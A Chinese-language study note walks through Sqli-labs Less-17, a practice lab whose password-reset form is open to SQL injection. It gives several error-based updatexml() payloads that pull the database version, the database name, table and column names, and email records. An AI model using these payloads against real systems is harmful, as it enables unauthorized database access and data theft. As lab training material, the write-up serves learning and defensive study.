Sql注入学习笔记——基于Sqli-labs平台(Less-17)

第十七关，打开后发现有个标题叫做PASSWORD RESET

看到密码重置就想能想到背后的sql语句了

应该是用update语句来进行重置密码操作

所以此题应该是update注入

对参数进行fuzz

对uname参数进行fuzz时，发现单双引号不行，无法报错。那是不是就是盲注了？？

别慌，还有一个passwd参数，对其单引号测试时，发现单引号报错

不过我们这里需要先知道一个存在的username，因为一般后台应该会先检测用户名是否存在，再进行重置密码操作。

猜测后台sql语句

我们需要猜测一下update形式的sql语句，才能合理的构造出payload

一般update的语句都为：
  UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值

我们可以看到，报错信息显示：
  在admin处，也就是我们输入的uname处多了一个单引号
所以，我们在uname输入admin，passwd输入单引号后的后台sql语句应该为：
  update users set password = ''' where username = 'admin'

ok，基于update的注入一般是利用报错注入，因为它无法跟union语句组合在一起。

使用updatexml()函数报错

payload：

uname=admin&passwd=123' or updatexml(1,concat(0x7e,(version())),0) or '&submit=Submit

报错注入——数据库名

payload：

uname=admin&passwd=123' or updatexml(1,concat(0x7e,(database())),0) or '&submit=Submit

报错注入——表名

payload：

uname=admin&passwd=123' or updatexml(1,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or '&submit=Submit

报错注入——字段名

payload：

uname=admin&passwd=123' or updatexml(1,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name = 'users' limit 1,1)),0) or '&submit=Submit

报错注入——内容

payload：

uname=admin&passwd=123' or updatexml(1,concat(0x7e,(SELECT concat(email_id) FROM emails limit 0,1)),0) or '&submit=Submit

这里有个问题是，当后台是update的users表的话，那么我们就不能查询(select)users表了。会报错
You can't specify target 'users' for update in FROM clause

mysql中You can’t specify target table for update in FROM clause错误的意思是说，不能先select出同一表中的某些值，再update这个表(在同一语句中)。

所以，要想查询同一表的数据，可以使用子查询来处理

OK！第十七关完成啦~基于update的报错注入手法~
